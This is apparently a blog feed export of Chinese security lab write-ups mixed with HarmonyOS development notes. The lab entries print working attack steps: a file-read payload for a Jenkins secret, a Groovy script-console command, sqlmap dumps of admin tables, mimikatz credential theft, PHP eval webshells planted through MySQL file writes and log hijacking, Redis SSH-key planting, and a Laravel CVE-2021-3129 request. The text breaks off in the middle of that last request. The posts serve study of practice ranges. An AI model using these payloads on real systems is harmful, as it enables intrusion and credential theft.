MFC开发程序，就需要了解框架中相关的关键类以及函数，这里通过AfxMessageBox函数快速确定了弹出的对话框，辅助对代码功能的分析。</li><li>无论动态分析工具还是静态分析工具，都提供了自动化较强的“汇编”和“补丁”工具，这样可以方便对原程序的修改。</li></ul><h2 id="4-习题"><a href="#4-习题" class="headerlink" title="4. 习题"></a>4. 习题</h2><ol><li>对于本实验内容，除了修改为jle指令，还可以怎么修改？</li><li>在使用ida pro静态分析一段数据时，如果怀疑是一段字符串，那么如何使其能正确显示其内容，而不是默认显示16进制编码？</li><li>请查阅资料，说明本文提到的各类条件跳转指令的含义以及区别。</li><li>每当进入一个函数，开辟新的栈帧，此时栈顶数据是什么？</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/10/21/penetration/%E4%BA%91%E9%95%9C/"/>
    <url>/2024/10/21/penetration/%E4%BA%91%E9%95%9C/</url>
    
    <content type="html"><![CDATA[<p>扫一下端口</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707130901.png"></p><p>有一个Jenkins</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707130951.png"></p><p><a href="https://blog.csdn.net/qq_34594929/article/details/136446671">Jenkins 任意文件读取(CVE-2024-23897)+后台用户密码提取哈希破解+反弹Shell 一条龙-CSDN博客</a><br>好的没给我题目 没有CVE-2024-23897</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/1b251aa6b9f6055c91c1d8717238496.png" alt="1b251aa6b9f6055c91c1d8717238496.png"></p><p>有源码 扫一下目录<br><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707135405.png"><br>发现<a href="http://www.zip/">www.zip</a> 下载下来查看源码<br><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707135441.png"></p><p>这里面有任意读取文件漏洞  结合admin用户的初始密码路径<br><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707135627.png"></p><p>构造payload ：&#x2F;tools&#x2F;content-log.php?logfile&#x3D;C:\ProgramData\Jenkins.jenkins\secrets\initialAdminPassword</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707135724.png"></p><p>Jenkins rce漏洞</p><p>Jenkins管理登陆之后，后台”系统管理”功能，有个”脚本命令行的”功能，它的作用是执行用于管理或故障探测或诊断的任意脚本命令，利用该功能，可以执行系统命令，该功能实际上Jenkins正常的功能，由于很多管理账号使用了弱口令，或者管理后台存在未授权访问，导致该功能会对Jenkins系统服务器产生比较严重的影响和危害。即访问&#x2F;script</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">println <span class="hljs-string">&quot;whoami&quot;</span>.<span class="hljs-built_in">execute</span>().text<br></code></pre></td></tr></table></figure><p>进入后在脚本命令行添加用户<br><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707143729.png"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20240707143741.png"></p><p>RDP连接后找到第一个flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HarmonyOS开发</title>
    <link href="/2024/06/27/HarmonyOS/HarmonyOS%E5%BC%80%E5%8F%91/"/>
    <url>/2024/06/27/HarmonyOS/HarmonyOS%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="华为开发者日常使用的网址合集"><a href="#华为开发者日常使用的网址合集" class="headerlink" title="华为开发者日常使用的网址合集"></a><strong>华为开发者日常使用的网址合集</strong></h1><p>华为官网：<a href="https://developer.huawei.com/">https://developer.huawei.com/</a></p><p>开发者空间：<a href="https://developer.huaweicloud.com/space/home">https://developer.huaweicloud.com/space/home</a></p><p>开发者官网：<a href="https://developer.huawei.com/consumer/cn/">https://developer.huawei.com/consumer/cn/</a></p><h2 id="开发鸿蒙"><a href="#开发鸿蒙" class="headerlink" title="开发鸿蒙"></a><strong>开发鸿蒙</strong></h2><p>编辑器（DevEco Studio Next）：<a href="https://developer.huawei.com/consumer/cn/deveco-studio/">https://developer.huawei.com/consumer/cn/deveco-studio/</a></p><p>官网三方库（ohpm）：<a href="https://ohpm.openharmony.cn/#/cn/home">https://ohpm.openharmony.cn/#/cn/home</a></p><p>编程语言（ArkTs）：<a href="https://developer.huawei.com/consumer/cn/arkts">https://developer.huawei.com/consumer/cn/arkts</a></p><p>测试工具（DevEco Testing）：<a href="https://developer.huawei.com/consumer/cn/deveco-testing/">https://developer.huawei.com/consumer/cn/deveco-testing/</a></p><p>开发文档：<a href="https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/application-dev-guide-V5">https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/application-dev-guide-V5</a></p><p>视频课程：<a href="https://developer.huawei.com/consumer/cn/training/">https://developer.huawei.com/consumer/cn/training/</a></p><p>学习资料：</p><ul><li>示例代码：<a href="https://developer.huawei.com/consumer/cn/samples/">https://developer.huawei.com/consumer/cn/samples/</a></li><li>零基础入门学习资料参考：<a href="https://hm.codefe.cn/docs/tutorial/intro/">https://hm.codefe.cn/docs/tutorial/intro/</a></li><li>开发资料包合集：<a href="https://docs.qq.com/sheet/DQ0JyZlFPVVJIR3RK?tab=w70n0s">https://docs.qq.com/sheet/DQ0JyZlFPVVJIR3RK?tab=w70n0s</a></li></ul><h2 id="仓颉"><a href="#仓颉" class="headerlink" title="仓颉"></a><strong>仓颉</strong></h2><p>官网：<a href="https://developer.huawei.com/consumer/cn/cangjie/">https://developer.huawei.com/consumer/cn/cangjie/</a></p><p>开发文档：<a href="https://developer.huawei.com/consumer/cn/doc/openharmony-cangjie/cj-wp-abstract">https://developer.huawei.com/consumer/cn/doc/openharmony-cangjie/cj-wp-abstract</a></p><p>预览版Beta招募报名：<a href="https://developer.huawei.com/consumer/cn/activity/301718873654579080">https://developer.huawei.com/consumer/cn/activity/301718873654579080</a></p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a><strong>AI</strong></h2><p>华为云官网：<a href="https://developer.huaweicloud.com/">https://developer.huaweicloud.com/</a></p><p>软件开发生产线 CodeArts：<a href="https://www.huaweicloud.com/devcloud/">https://www.huaweicloud.com/devcloud/</a></p><p>AI开发平台 ModelArts：<a href="https://www.huaweicloud.com/product/modelarts.html">https://www.huaweicloud.com/product/modelarts.html</a></p><p>数据治理中心 DataArts：<a href="https://www.huaweicloud.com/product/dayu.html">https://www.huaweicloud.com/product/dayu.html</a></p><p>数字内容生产线 MetaStudio：<a href="https://www.huaweicloud.com/product/mdh.html">https://www.huaweicloud.com/product/mdh.html</a></p><p>控制台：<a href="https://console.huaweicloud.com/console/?region=cn-north-4#/home">https://console.huaweicloud.com/console/?region=cn-north-4#/home</a></p><p>免费领取：</p><ul><li>新账号（体验官招募计划）：<a href="https://activity.huaweicloud.com/flexus_voc/index.html">https://activity.huaweicloud.com/flexus_voc/index.html</a></li><li>对象存储服务（OBS）：<a href="https://www.huaweicloud.com/product/obs.html">https://www.huaweicloud.com/product/obs.html</a></li></ul><h2 id="组件学习"><a href="#组件学习" class="headerlink" title="组件学习"></a>组件学习</h2><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>Image组件的必选参数src。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Image</span><span class="hljs-params">(<span class="hljs-string">&#x27;https://xyz/test.jpg&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>需要在<strong>src&#x2F;main&#x2F;module.json5</strong>添加申请网络权限</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-string">&quot;requestPermissions&quot;</span>: [  <br>&#123;  <br><span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;ohos.permission.INTERNET&quot;</span>  <br>&#125;  <br>]<br></code></pre></td></tr></table></figure><p>也可以使用本地资源</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Image</span><span class="hljs-params">(<span class="hljs-variable">$r</span>(<span class="hljs-string">&#x27;app.media.background&#x27;</span>)</span></span>)<span class="hljs-selector-class">.width</span>(<span class="hljs-number">100</span>)<br><span class="hljs-comment">//$r形式引入应用资源，可应用于多语言场景</span><br><br></code></pre></td></tr></table></figure><h3 id="row-column"><a href="#row-column" class="headerlink" title="row&amp;column"></a>row&amp;column</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Row</span><span class="hljs-params">()</span></span><br><span class="hljs-comment">//行容器</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Column</span><span class="hljs-params">(&#123;space:<span class="hljs-number">50</span>&#125;)</span></span><br>列容器 space可设置容器中组件间隔<br></code></pre></td></tr></table></figure><h3 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h3><p>@Component  用于修饰组件</p><p>@Entry 用于修饰显示的主页面</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-meta">@Component</span>  <br>struct itemComponent&#123;  <br>  <span class="hljs-meta">@State</span> <span class="hljs-built_in">bool</span>:boolean=<span class="hljs-keyword">false</span>  <br>  content :string=<span class="hljs-string">&#x27;&#x27;</span>  <br>  build() &#123;  <br>    Row()&#123;  <br>      Image(<span class="hljs-keyword">this</span>.<span class="hljs-built_in">bool?</span>$r(<span class="hljs-string">&#x27;app.media.foreground&#x27;</span>):$r(<span class="hljs-string">&#x27;app.media.background&#x27;</span>)).width(<span class="hljs-string">&#x27;30&#x27;</span>)  <br>      Text(<span class="hljs-keyword">this</span>.content)<br>      .decoration(&#123;type:<span class="hljs-keyword">this</span>.<span class="hljs-built_in">bool?</span>TextDecorationType.LineThrough:TextDecorationType.None&#125;)  <br>    &#125;  <br>    .backgroundColor(Color.Pink)  <br>    .borderRadius(<span class="hljs-number">25</span>)<span class="hljs-comment">//使边框变为圆角  </span><br>    .margin(&#123;  <br>      top:<span class="hljs-number">15</span>  <br>    &#125;)  <br>    .onClick(()=&gt;&#123;  <br>        <span class="hljs-keyword">this</span>.<span class="hljs-built_in">bool</span>=<span class="hljs-keyword">true</span>  <br>    &#125;)  <br>  &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>itemComponent({content:’hhhh’}) 参数可以直接传递</p><h4 id="State"><a href="#State" class="headerlink" title="@State"></a>@State</h4><p>用于修饰动态变量 可动态</p><h4 id="组件函数"><a href="#组件函数" class="headerlink" title="组件函数"></a>组件函数</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Builder</span> function <span class="hljs-built_in">mmm</span>(<span class="hljs-attribute">content </span>: string)&#123;&#125;<br></code></pre></td></tr></table></figure><p>写在最外层的自定义组件构建函数 方便多组件共同调用</p><p>但是注意函数里面不能修改值 如果需要改变参数值 使用@Link</p><p>写在内层的构建函数只能在组件内部使用，组件外部访问不到</p>]]></content>
    
    
    <categories>
      
      <category>HarmonyOS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免杀学习</title>
    <link href="/2024/06/17/re/2024-6-17-%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/06/17/re/2024-6-17-%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>字符串的隐藏</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span> aaaa[] = &#123; <span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-number">0</span> &#125;;<br></code></pre></td></tr></table></figure><p>命令行传参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc，<span class="hljs-type">char</span> *argv[])</span><br></code></pre></td></tr></table></figure><p>argc:命令行参数的个数，也就是argv的个数，默认为1</p><p>argv:命令行参数的数组，argv[0]，代表第一个字符串参数的地址</p>]]></content>
    
    
    <categories>
      
      <category>免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>铁三域控</title>
    <link href="/2024/01/22/penetration/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/"/>
    <url>/2024/01/22/penetration/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122100842191.png" alt="image-20240122100842191"></p><p>fscan先粗略扫一遍</p><p>有一个141的永恒之蓝可以利用</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122101234048.png" alt="image-20240122101234048"></p><p>123的是一个织梦的cms 拿新学的yakit扫一遍目录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122101844114.png" alt="image-20240122101844114"></p><p>sql目录能进行sqlmap梭</p><p>爆库 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> –dbs</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102118718.png" alt="image-20240122102118718"></p><p>爆表 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 –tables</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102143865.png" alt="image-20240122102143865"></p><p>爆字段 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 -T flag –dump</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102404025.png" alt="image-20240122102404025"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102935171.png" alt="image-20240122102935171"></p><p>一个后台管理平台 想着能爆数据库那么也能拿管理员密码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102836711.png" alt="image-20240122102836711"></p><p>这边查一下存放密码字段的表</p><p>sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 -T topsec_admin –dump</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122112327296.png" alt="image-20240122112327296"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122112312381.png" alt="image-20240122112312381"></p><p>登录在文件管理处上马 其实没必要 上一次就有flag</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122113012933.png" alt="image-20240122113012933"></p><p>redesktop 连接那台141永恒之蓝 密码就是在密码库里爆出来的没加md5的</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122142611590.png" alt="image-20240122142611590"></p><p>自带的mimikatza抓一波域密码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122145542263.png" alt="image-20240122145542263"></p><p>直接远程连接拿flag </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122152802811.png" alt="image-20240122152802811"></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attck1</title>
    <link href="/2023/12/17/penetration/attck1/"/>
    <url>/2023/12/17/penetration/attck1/</url>
    
    <content type="html"><![CDATA[<p>红日系列靶场attck1</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20210413164206482.png" alt="在这里插入图片描述"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">攻击者：<br>kali<br><span class="hljs-number">172.17.137.93</span><br><br>windows<br><span class="hljs-number">172.17.137.87</span><br><br>靶场：<br>VM1：对外边界服务器，win7<br><span class="hljs-number">192.168.52.143</span><br><span class="hljs-number">172.17.137.105</span><br><br>VM2：域成员，<span class="hljs-number">2003</span><br><span class="hljs-number">192.168.52.141</span><br><br>VM3：域控，<span class="hljs-number">2008</span><br><span class="hljs-number">192.168.52.138</span><br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127164203012.png" alt="image-20231127164203012"></p><p>访问80端口 是一个PHP探针</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127164251109.png" alt="image-20231127164251109"></p><p>mysql数据库有弱密码 root root可以连接</p><p>由于是phpstudy创建的网站 一般会有phpmyadmin</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127171656942.png" alt="image-20231127171656942"></p><p>进入尝试写入shell</p><p>方案一：直接写入shell</p><p>执行查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure><p>放secure_file_priv的值为空时可以直接写入shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;re&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;C:/phpstudy/WWW/shell2.php&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127172038224.png" alt="image-20231127172038224"></p><p>这边的值不为空（NULL不为空）（这意味着MySQL服务器不允许在安全文件目录之外的任何位置进行文件操作） 且secure_auth（安全文件目录）是不存在的 也就是全局禁止文件操作</p><p>解决方案（<a href="https://www.dbs724.com/224656.html%EF%BC%89%E8%BF%99%E4%B8%AA%E6%9B%B4%E6%94%B9%E5%B0%B1%E9%9C%80%E8%A6%81%E6%95%B4%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.dbs724.com/224656.html）这个更改就需要整个计算机的权限</a></p><p>方案二：日志写入shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><p>查看是否开启全局日志记录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127173220349.png" alt="image-20231127173220349"></p><p>没有开启时可以通过开启并更改日志路径和日志文件为php文件。通过日志记录一句话木马来利用。</p><p>开启命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=ON<br></code></pre></td></tr></table></figure><p> 更改路径命令为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpstudy/WWW/c&#x27;</span><br></code></pre></td></tr></table></figure><p>（phpstudy路径？探针里面写的明明白白了）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127173556443.png" alt="image-20231127173556443"></p><p>执行成功可以发现全局日志打开 并且日志文件更改为我们设置的shell文件</p><p>此时我们查询的语句会被记录到日志文件中</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>蚁剑开连</p><p>systeminfo收集本机信息</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127174203621.png" alt="image-20231127174203621"></p><p>上线msf</p><p>能出网 反弹shell 添加路由</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127183516316.png" alt="image-20231127183516316"></p><p>存在192.168.52.0网段</p><p>arp 探测内网存活主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/gather/arp_scanner<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.0/24<br><br><span class="hljs-built_in">set</span> SESSION 1<br><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127202100584.png" alt="image-20231127202100584"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127194532845.png" alt="image-20231127194532845"></p><p>mimikatz读一下密码</p><p>很明显里面存在GOD域控</p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attck3</title>
    <link href="/2023/12/17/penetration/attck3/"/>
    <url>/2023/12/17/penetration/attck3/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192547124.png" alt="image-20231203192547124"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192601414.png" alt="image-20231203192601414"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192629100.png" alt="image-20231203192629100"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203611997.png" alt="image-20231203203611997"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203535589.png" alt="image-20231203203535589"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203549795.png" alt="image-20231203203549795"></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attck2</title>
    <link href="/2023/12/17/penetration/attck2/"/>
    <url>/2023/12/17/penetration/attck2/</url>
    
    <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203102647003.png" alt="image-20231203102647003"></p><p>danima</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194822984.png" alt="image-20231204194822984"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194847872.png" alt="image-20231204194847872"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194731016.png" alt="image-20231204194731016"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204200831924.png" alt="image-20231204200831924"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204200841136.png" alt="image-20231204200841136"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204205330432.png" alt="image-20231204205330432"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204205344634.png" alt="image-20231204205344634"></p>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attck7</title>
    <link href="/2023/12/17/penetration/attck7/"/>
    <url>/2023/12/17/penetration/attck7/</url>
    
    <content type="html"><![CDATA[<p>att ck7靶场</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/1614336174_6038d0ae97a56a0f1e287.png!small" alt="20210226161713.png"></p><h2 id="获取第一台DMZ主机（192-168-52-10）"><a href="#获取第一台DMZ主机（192-168-52-10）" class="headerlink" title="获取第一台DMZ主机（192.168.52.10）"></a>获取第一台DMZ主机（192.168.52.10）</h2><p>拿fscan扫一下 发现有redis未授权访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-keygen -t rsa<br><br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; test.txt <span class="hljs-comment">#将公钥id_rsa.pub文件写入test.txt文件</span><br><br>cat test.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span> -x set crack<br><br>redis-cli -h xx.xx.xx.xx<br><br>​&gt; config set dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">#这步需要redis服务使用root权限开启 否则更改不了路径</span><br><br>​&gt; config set dbfilename authorized_keys<br><br>​&gt;save<br><br>​&gt;<span class="hljs-keyword">exit</span><br><br>cd <span class="hljs-regexp">/root/</span>.ssh<br><br>ssh -i id_rsa root@<span class="hljs-number">172.17</span>.<span class="hljs-number">137.102</span><br></code></pre></td></tr></table></figure><h2 id="第二台主机（192-168-52-20）"><a href="#第二台主机（192-168-52-20）" class="headerlink" title="第二台主机（192.168.52.20）"></a>第二台主机（192.168.52.20）</h2><p>首先是公开在网络上的172.17.137.xx </p><p>一个laravel框架漏洞</p><p>Laravel RCE CVE-2021-3129</p><p>测试漏洞存在</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>328<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;xxxxx&quot;</span></span><br><span 